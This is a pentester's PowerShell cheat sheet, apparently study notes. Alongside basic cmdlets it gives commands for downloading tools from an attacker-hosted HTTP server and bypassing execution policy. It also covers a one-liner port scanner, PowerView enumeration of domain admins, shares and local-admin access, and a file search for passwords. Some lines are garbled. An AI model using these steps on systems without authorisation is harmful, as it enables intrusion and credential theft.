Powershell

powershell scripts:
PowerView and Nishang


Start PowerShell on CMD> powershell.exe
```
# Powershell Commands:
whoami /priv
Get
Start
Stop 
Read
Write
New
Out
Get-Help			- displays info on cmdlet
-exmaples
get-command <verb>-*				- i.e get-command New-* will search for files with new in it
Common verbs to use include:
• Get
• Start
• Stop 
• Read
• Write
• New
• Out
Get-Command *-<noun>
powershell -c "Invoke-WebRequest -Uri 'http://<tun0>:<ipfromserver>/<file>' -OutFile 'C:\Windows\Temp\<file>'"				- recieving a file from linux, host server:  python3 http.server
Get-Help Get-Command -Examples 
Get-Command 			- gets all the cmdlets installed on the current Computer  
Get-Command -CommandType Cmdlet | measure				- lists how many cmdlets
cls
|			- The Pipeline ( | ) is used to pass output from one cmdlet to another  
A major difference compared to other shells is that instead of passing text or string to the command after the pipe, powershell passes an object to the next cmdlet.   
Get-Command | Get-Member -MemberType Method  			- view the members for Get-Command 
Get-Command | Get-Member -MemberType Property			- 
Select-Object  			- used for pulling out the properties from the output of a cmdlet and creating a new object  
Where-Object 				- to filter based on the value of properties.   
Get-Service | Where-Object -Property Status -eq Stopped				- views stopped processes
Get-Service | Where-Object -Property Status -eq Running				- views running processes
Get-ChildItem |Sort-Object				- lists directories
Get-ChildItem | Select-Object -Property Mode, Name			- listing the directories 
Get-ChildItem				- equivalent to ls -l
Get-Location					- list current directory
Invoke-WebRequest			- used to make a request to a web server
Get-ChildItem -Path C: -Include <file>.txt -File -Recurse -ErrorAction SilentlyContinue			- find a file
Get-FileHash -Path "C:\<filepath>" -Algorithm MD5
Get-FileHash -Algorithm SHA256 .\<filename>				- get hash of a file
certutil -decode "C:\<filepath>" file.txt				- decode base64 then cat file.txt
certutil -encode "C:\<filepath>" file.txt				- encode base64 then cat file.txt
Get-LocalUser				- gets users on system
Get-LocalUser | Where-Object -Property PasswordRequired -Match false				- check for users not required passwords
Get-NetIPAddress				- get detailed ip info
Get-ChildItem -Path C: -Include .bak -File -Recurse -ErrorAction SilentlyContinue				- look for backup files
Get-Content "C:\<filepath>"				- cat or read a file
Get-Content .\file.txt		
Get-ChildItem C:* -Recurse | Select-String -pattern <filename>				- search for a file
Get-Process					- lists processes
Get-Process -name notepad   	- specifys name of the process ie notepad
Get-Acl C:\					- check owner of C:\
Start-Process notepad.exe					- start a program/process  ie notepad.exe
Copy-Item .\<filename>					- copy an item
Move-Item <filepath> <filepath>				- move an item
(New-Object System.Net.WebClient).Downloadfile('http://<IPofHost>:<portPY3Server>/<filename>.ps1')			- downloading a file, first setup python3 server, python3 -m http.server 4444
Get-ExecutionPolicy -list				- lists execution policy
Execution policies can have seven different values;
AllSigned: Scripts can run but require all scripts to be signed by a trusted publisher.
Bypass: All scripts can run, and no warnings or prompts will be displayed.
Default: This refers to “restricted” for Windows clients and “RemoteSigned” for Windows servers.
RemoteSigned: Scripts can run, and this does not require local scripts to be digitally signed.
Restricted: The default configuration for Windows clients. Allows individual commands to run, does not allow scripts.
Undefined: This shows that no specific execution policy was set. This means default execution policies will be enforced.
Unrestricted: Most scripts will run.

powershell -ExecutionPolicy Bypass -File .\<filename.ps1>			- bypass policy
Set-ExecutionPolicy Bypass -Scope <ScopeName>				- sets parameter for current powershell session, will revert and session is closed
Invoke-WebRequest "http://<ipofhost>:<port>/<filename>" -OutFile "<newfilename>"				- send a file
Get-Hotfix				- enumerate already installed patches
Get-Hotfix | Format-list | findstr InstalledOn 			- Get-Hotfix | Format-list | findstr InstalledOn
dir | Format-List *			- More information on directory list
1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("<ip>|, $_)) "Open port on - $_"} 2>$null				- scans first 1024 ports, change IP
After downloading 	https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1	Send to Windows machine THEN
Import-Module .\powerview.ps1
THEN can use the following commands::
Get-NetDomainController  			- gets information about the domain controller
Get-NetUser  				- list of domain users detailed
(Get-NetUser ).name			- list just domain users
Get-NetUser | select -ExpandProperty lastlogon			- gets last logon date/time by users
Get-NetComputer  -ping				- enumerate systems connected to the domain, sees which are currently online
Get-NetGroup  				- gets users groups, check for users in domain admins /detailed
Get-NetGroupMember  "Domain Admins"  			- search for users in domain admins specific
Get-NetGPO					- gathers information on enforced policies
Get-NetDomainTrust				- lists any domain you can access
Find-LocalAdminAccess				- lists systems in the domain you may access as a local admin
Find-DomainShare -CheckShareAccess 				-Search readable shares  
https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview





https://learnxinyminutes.com/docs/powershell/
powershell scripts are usually saved as .ps1

open port script:create ports.txt file with common open ports, this will check if they are open

$system_ports = Get-NetTCPConnection -State Listen

$text_port = Get-Content -Path C:\Users\Administrator\Desktop\ports.txt

foreach($port in $text_port){

    if($port -in $system_ports.LocalPort){
        echo $port
     }

}




Find text within a file, make a powershell file findtext.ps1 then run .\findtext.ps1
$path = "C:<filepath>*"

$string_pattern = "<passwordORanyText"

$command = Get-ChildItem -Path $path -Recurse | Select-String -Pattern $String_patternecho $command


Port scanner:adjust:130 to 1 and 140 to max ports:
for($i=130; $i -le 140; $i++){
    
Test-NetConnection localhost -Port $i

}
```
